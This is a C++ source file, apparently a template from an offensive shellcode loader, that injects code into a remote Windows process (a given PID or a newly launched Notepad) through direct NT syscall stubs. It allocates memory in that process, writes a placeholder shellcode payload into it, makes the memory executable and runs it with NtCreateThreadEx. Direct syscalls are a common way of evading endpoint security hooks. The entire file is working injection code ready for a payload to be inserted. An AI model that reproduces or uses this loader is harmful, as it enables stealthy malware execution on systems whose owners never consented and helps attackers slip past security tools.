/**
Author: Thomas X Meng
Classic NT API
***/
#include <windows.h>
#include <cstdio>
#include "./classic_stubs/syscalls.h" // Import the generated header.

typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);


unsigned char magiccode[] = ####SHELLCODE####;

void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE_T magiccodeSize);

void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE_T magiccodeSize) {
    HANDLE hThread = NULL;
    LPVOID lpAllocationStart = NULL;
    SIZE_T szAllocationSize = magiccodeSize; // Size is now based on magiccode length
    NTSTATUS status;
    ULONG oldProtect = 0;
    
    // Allocation of memory for the magiccode in the target process
    status = NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, &magiccodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status == 0) {
        printf("[+] Memory allocated for magiccode\n");
    } else {
        printf("[-] Memory allocation failed\n");
        return;
    }

    // // Allocation of memory for the magiccode in the target process
    // status = NtAllocateVirtualMemory(GetCurrentProcess(), &lpAllocationStart, 0, &magiccodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // if (status == 0) {
    //     printf("[+] Memory allocated for magiccode\n");
    // } else {
    //     printf("[-] Memory allocation failed\n");
    //     return;
    // }

    // Writing the magiccode to the allocated memory in the target process
    status = NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)magiccode, magiccodeSize, NULL);
    if (status == 0) {
        printf("[+] magiccode written to memory\n");
    } else {
        printf("[-] Failed to write magiccode to memory\n");
        return;
    }

	// This step is optional, but it's good practice to change the memory protection back to its original state
    status = NtProtectVirtualMemory(hProcess, &lpAllocationStart, &magiccodeSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status == 0) {
        printf("[+] Memory protection changed back successfully\n");
    } else {
        printf("[-] Failed to change memory protection back\n");
    }
    
    // Creating a thread in the target process to execute the magiccode
    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);
    if (status == 0) {
        printf("[+] Thread created to execute magiccode\n");
    } else {
        printf("[-] Failed to create thread\n");
        return;
    }

    // Wait for the magiccode to execute
    DWORD waitResult = WaitForSingleObject(hThread, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }

    // CloseHandle(hThread);
}


BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

int main(int argc, char *argv[])
{

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer

    //check if pid is provided as argument: 
    if (argc > 1) {
        pid = atoi(argv[1]);
        printf("[+] PID provided: %d\n", pid);
        // get pi information from pid:
        pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
    } else {
        printf("[-] PID not provided\n");
        // Determine the correct Notepad path based on system architecture
        if (IsSystem64Bit()) {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
        } else {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
        }

        // Attempt to create a process with Notepad
        BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (!success) {
            MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
            return 1; // Exit if unable to start Notepad
        }
        printf("Notepad started with default settings.\n");
        pid = pi.dwProcessId;  
        printf("[+] notepad PID: %d\n", pid);      
    }


    SIZE_T magiccodeSize = sizeof(magiccode);

	printf("[+] Classic execution starts, I will be whispering in your ears 2 \n");
    Injectmagiccode(pi.hProcess, magiccode, magiccodeSize);

    // CloseHandle(pi.hProcess);
    // CloseHandle(pi.hThread);

	return 0;
}